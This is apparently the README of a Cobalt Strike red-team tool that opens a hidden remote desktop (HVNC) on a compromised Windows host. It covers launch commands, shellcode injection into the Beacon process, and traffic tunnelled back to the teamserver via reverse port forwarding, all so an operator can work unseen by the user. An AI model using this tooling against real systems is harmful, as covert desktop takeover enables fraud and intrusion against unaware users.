# Hidden Desktop BOF

Hidden Desktop (often referred to as HVNC) is a tool that allows operators to interact with a remote desktop session without the user knowing. The VNC protocol is not involved, but the result is a similar experience. This Cobalt Strike BOF implementation was created as an alternative to TinyNuke/forks that are written in C++.

There are four components of Hidden Desktop:

1. BOF initializer: Small program responsible for injecting the HVNC code into the Beacon process.

2. HVNC shellcode: PIC implementation of TinyNuke HVNC.

3. Server and operator UI: Server that listens for connections from the HVNC shellcode and a UI that allows the operator to interact with the remote desktop. Currently only supports Windows.

4. Application launcher BOFs: Set of Beacon Object Files that execute applications in the new desktop.

## Usage

Download the [latest release](https://github.com/WKL-Sec/HiddenDesktop/releases) or compile yourself using `make`. Start the HVNC server on a Windows machine accessible from the teamserver. You can then execute the client with:

```
HiddenDesktop <server> <port>
```

You should see a new blank window on the server machine. The BOF does not execute any applications by default. You can use the application launcher BOFs to execute common programs on the new desktop:

```
hd-launch-edge
hd-launch-explorer
hd-launch-run
hd-launch-cmd
hd-launch-chrome
```

You can also launch programs through File Explorer using the mouse and keyboard. Other applications can be executed using the following command:

```
hd-launch <command> [args]
```

## Demo

https://github.com/WKL-Sec/HiddenDesktop/assets/9327972/c9b3fbc1-dd83-45cd-96cd-b026c9b5d827

## Implementation Details

1. The Aggressor script generates random pipe and desktop names. These are passed to the BOF initializer as arguments. The desktop name is stored in CS preferences at execution and is used by the application launcher BOFs. HVNC traffic is forwarded back to the team server using `rportfwd`. Status updates are sent back to Beacon through a named pipe.
2. The BOF initializer starts by resolving the required modules and functions. Arguments from the Aggressor script are resolved. A pointer to a structure containing the arguments and function addresses is passed to the `InputHandler` function in the HVNC shellcode. It uses `BeaconInjectProcess` to execute the shellcode, meaning the behavior can be customized in a Malleable C2 profile or with process injection BOFs. You could modify Hidden Desktop to target remote processes, but this is not currently supported. This is done so the BOF can exit and the HVNC shellcode can continue running.
3. `InputHandler` creates a new named pipe for Beacon to connect to. Once a connection has been established, the specified desktop is opened (`OpenDesktopA`) or created (`CreateDesktopA`). A new socket is established through a reverse port forward (`rportfwd`) to the HVNC server. The input handler creates a new thread for the `DesktopHandler` function described below. This thread will receive mouse and keyboard input from the HVNC server and forward it to the desktop.
4. `DesktopHandler` establishes an additional socket connection to the HVNC server through the reverse port forward. This thread will monitor windows for changes and forward them to the HVNC server.

## Compatibility

The HiddenDesktop BOF was tested using [example.profile](example.profile) on the following Windows versions/architectures:

* Windows Server 2022 x64
* Windows Server 2016 x64
* Windows Server 2012 R2 x64
* Windows Server 2008 x86
* Windows 7 SP1 x64

## Known Issues

* The start menu is not functional.

## Credits

* Heavily based on [TinyNuke](https://github.com/rossja/TinyNuke)
* Included improvements/fixes from [Meltedd/HVNC](https://github.com/Meltedd/HVNC)
* Uses Beacon job interface and project structure from [SecIdiot/netntlm](https://github.com/SolomonSklash/netntlm)
